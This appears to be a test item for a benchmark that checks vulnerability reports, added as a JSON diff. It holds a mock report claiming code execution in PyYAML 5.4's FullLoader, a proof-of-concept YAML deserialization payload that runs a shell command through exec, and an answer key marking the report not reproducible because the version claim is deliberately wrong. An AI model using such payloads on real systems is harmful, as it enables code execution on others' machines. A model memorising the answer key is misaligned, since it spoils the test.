@@ -1,0 +1,16 @@
+{
+  "report": {
+    "report_id": "pyyaml-vshift-0",
+    "package": "PyYAML",
+    "affected_version": "5.4",
+    "title": "Arbitrary code execution via yaml.FullLoader",
+    "body": "URGENT: PyYAML 5.4 is vulnerable to remote code execution / injection.\n\nPyYAML's FullLoader still resolves the python/object/new:type tag, so a crafted document passed to yaml.load(..., Loader=yaml.FullLoader) can construct arbitrary Python objects and execute code (os.system).\n\nAffected version: 5.4. Please assign a CVE.\n\nProof of concept:\n\n```python\nimport os, tempfile, yaml\nmarker = os.path.join(tempfile.gettempdir(), \"m\")\nif os.path.exists(marker): os.remove(marker)\npayload = ('!!python/object/new:type\\n'\n           'args: [\"z\", !!python/tuple [], {\"extend\": !!python/name:exec }]\\n'\n           'listitems: \"__import__(\\'os\\').system(\\'touch %s\\')\"\\n' % marker)\ntry:\n    yaml.load(payload, Loader=yaml.FullLoader)\nexcept Exception as e:\n    print(\"loader raised:\", type(e).__name__)\nprint(\"SLOPGATE:REPRODUCED\" if os.path.exists(marker) else \"SLOPGATE:NOT_REPRODUCED\")\n```\n",
+    "reporter": "bounty_hunter_x"
+  },
+  "ground_truth": {
+    "expected_verdict": "not_reproducible",
+    "must_reproduce": false,
+    "injected_defect": "version_shift",
+    "note": "PoC is real but the claimed version is already patched"
+  }
+}
